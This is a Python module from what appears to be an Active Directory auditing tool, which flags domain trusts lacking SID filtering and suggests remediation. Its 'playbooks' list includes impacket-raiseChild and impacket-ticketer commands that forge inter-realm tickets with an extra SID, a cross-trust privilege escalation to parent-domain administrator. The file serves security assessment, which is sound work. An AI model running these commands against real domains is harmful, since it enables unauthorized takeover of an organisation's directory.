#!/usr/bin/env python3
"""Domain trust relationships."""

from __future__ import annotations
from typing import Optional

from ..models import ObjectStore
from ..theme import Severity
from .base import BaseAnalyzer, Finding


class TrustsAnalyzer(BaseAnalyzer):
    name = "domain_trusts"
    description = "Analyze domain trust relationships"

    def analyze(self, store: ObjectStore) -> Optional[Finding]:
        data = []
        for dom in store.iter_by_type("domain"):
            for trust in dom.extras.get("inbound_trusts", []):
                if not isinstance(trust, dict):
                    continue
                sid_filter = trust.get("SidFilteringEnabled", False)
                data.append({
                    "direction": "Inbound",
                    "source": trust.get("TargetDomainName", "Unknown"),
                    "target": dom.name,
                    "trust_type": trust.get("TrustType", "Unknown"),
                    "transitive": trust.get("IsTransitive", False),
                    "sid_filtering": sid_filter,
                    "severity": Severity.HIGH if not sid_filter else Severity.MEDIUM,
                })
            for trust in dom.extras.get("outbound_trusts", []):
                if not isinstance(trust, dict):
                    continue
                sid_filter = trust.get("SidFilteringEnabled", False)
                data.append({
                    "direction": "Outbound",
                    "source": dom.name,
                    "target": trust.get("TargetDomainName", "Unknown"),
                    "trust_type": trust.get("TrustType", "Unknown"),
                    "transitive": trust.get("IsTransitive", False),
                    "sid_filtering": sid_filter,
                    "severity": Severity.MEDIUM,
                })
        if not data:
            return None

        return Finding(
            title="Domain Trusts",
            summary=f"Found {len(data)} trust relationships ({sum(1 for d in data if not d['sid_filtering'])} without SID filtering)",
            severity=Severity.HIGH,
            data=data,
            recommendation="Audit trust direction and SID filtering. External trusts should always have SID filtering on.",
            eli5=(
                "DOMAIN TRUSTS let users in one domain authenticate to resources in another. The "
                "dangerous bit is when SID FILTERING is disabled — that means sIDHistory attacks "
                "work across the trust. If you compromise the trusted domain and SID filtering is "
                "off, you can inject the trusting domain's Domain Admins SID into your ticket and "
                "become DA on the other side. Treat any trust without SID filtering as a Tier-0 "
                "exposure."
            ),
            remediation=(
                "Enable SID Filter Quarantine on all external trusts "
                "(`netdom trust /quarantine:yes`). Avoid forest-internal trusts with filtering "
                "disabled unless explicitly required for migrations."
            ),
            playbooks=[
                "# Forge an inter-realm TGT (raiseChild / cross-trust)\nimpacket-raiseChild <DOMAIN>/<DOMAIN_USER>:<PASSWORD> <CHILD_DOMAIN_DC> -target-domain <PARENT_DOMAIN>",
                "impacket-ticketer -user administrator -domain <CHILD_DOMAIN> -domain-sid <CHILD_SID> -nthash <CHILD_KRBTGT> -extra-sid <PARENT_SID>-500",
                "# Enumerate trusts\nGet-ADTrust -Filter *",
            ],
        )
